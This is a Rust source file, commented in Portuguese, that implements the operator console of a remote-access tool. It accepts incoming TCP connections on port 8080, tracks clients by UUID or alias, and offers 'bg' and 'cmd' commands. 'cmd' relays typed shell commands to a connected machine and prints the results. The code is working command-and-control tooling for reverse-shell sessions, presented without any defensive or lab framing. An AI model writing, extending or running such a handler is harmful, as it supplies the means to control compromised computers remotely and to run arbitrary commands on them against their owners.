use std::io::prelude::*;
use std::net::{TcpListener, TcpStream};
use std::io;
use std::sync::Arc;
use uuid::Uuid;
use std::thread;


use crate::utils::servers::database_struct::Database;
use crate::utils::servers::database_struct::ClientInfo;

pub fn spawn_server(database:Arc<Database>){
    
      thread::spawn(move ||{
        server(database);
    });
}

pub fn server(database:Arc<Database>){

    
    let listener = TcpListener::bind("127.0.0.1:8080")
    .expect("Erro ao Iniciar o Listener.");


    
    for stream in listener.incoming(){
        let id =Uuid::new_v4();
        match stream {
            Ok(stream) => {
                let stream_copy = stream.try_clone().expect("Erro ao clonar a stream");
                let client = ClientInfo::new(stream_copy, "NULL");


                let stream_copy = stream.try_clone().expect("Erro ao clonar a stream");
                println!("Novo cliente conectado {}",stream_copy.peer_addr().unwrap().ip());

                // let stream_copy = stream.try_clone().expect("Erro ao clonar a stream");
                let database_clone = Arc::clone( &database);
                database_clone.add_client(id, client);

                // vetor.lock().unwrap().insert(id, stream_copy);
              
               
            }
            Err(e) => println!("Stream Error! :{}",e),
        }
    }

}

pub fn handle_clients(database: Arc<Database>, input:&str) {

     
    let database_clone = Arc::clone(&database);

    // Tenta buscar pelo alias
    if let Some(id) = database_clone.alias_to_id(input) {
        // Alias existe: usa o ID associado
        match database_clone.get_stream(&id) {
            Some(ip) => handle_tcp(&ip) ,
            None => println!("Cliente encontrado, mas sem conexão ativa."),
        }
    } else {
        // Se não é alias, tenta parsear como UUID
        match input.parse::<Uuid>() {
            Ok(uuid) => {
                match database_clone.get_stream(&uuid) {
                    Some(ip) =>  handle_tcp(&ip),
                    None => println!("UUID não encontrado ou sem conexão."),
                }
            }
            Err(_) => println!("Input inválido: não é um alias registrado nem um UUID."),
        }
    }
    
 
 

}

pub fn handle_tcp( stream: & TcpStream){
    // std::process::Command::new("clear").status().unwrap();
 
    loop {
        print!("{}>",stream.peer_addr().unwrap().ip());
        io::stdout().flush().expect("Falha ao fazer flush do stdout");


        let input2 = input();
 
        match input2.as_str(){
            "help" => {
                println!("-----Host-Commands----");
                println!("bg -> Backgrounds the session");
                println!("cmd -> Connect to remote shell terminal");
                println!("help -> Help message");
                println!("clear -> Clear the terminal history");
            }
            "bg" => break,
            "clear" => {
                std::process::Command::new("clear").status().unwrap();
            },
            "cmd" => {
                loop {
                    let dir = interact("cd".to_string(), stream).trim().to_string();

                    print!("{}",dir);
                    io::stdout().flush().expect("Falha ao fazer flush do stdout");
                    let input2 = input();
                    
                    match input2.as_str() {
                        "/help" => {
                            println!("----Cmd-Commands----");
                            println!("/exit -> Exit from cmd terminal.")
                        }
                        "/exit" => break,
                        _ => {
                            let resposta = interact(input2, stream).replacen(&dir, "",1);
                            println!("{}",resposta)},
                    }
                    
                }
            }
            _ => println!("Commando Invalido")            
        }
         
        
    }
}

pub fn manage_alias(database:Arc<Database>,id:&str,alias:&str){

        let id:Uuid = id.trim().parse().expect("Erro na conversão do buffer para Uuid");

    database.update_alias(&id,&alias);

}

fn interact(send: String, stream:&TcpStream) -> String {
 
    let send_bytes = send.as_bytes();

     let mut stream = stream;
    stream.write(send_bytes)
    .expect("Erro ao Enviar a mensagem");

    let mut get_bytes:[u8;65535] = [0; 65535];

    let temp_buffer = stream.read(&mut get_bytes)
    .expect("Erro ao ler a resposta");



    let resposta = String::from_utf8_lossy(&get_bytes[..temp_buffer]);

    return resposta.to_string();
    

}

pub fn input() -> String{
    let mut buffer = String::new();
    io::stdin().read_line(&mut buffer).expect("Erro ao ler input");
    let input = buffer.trim().to_string(); // Input tratado (sem espaços extras)
    return input;
}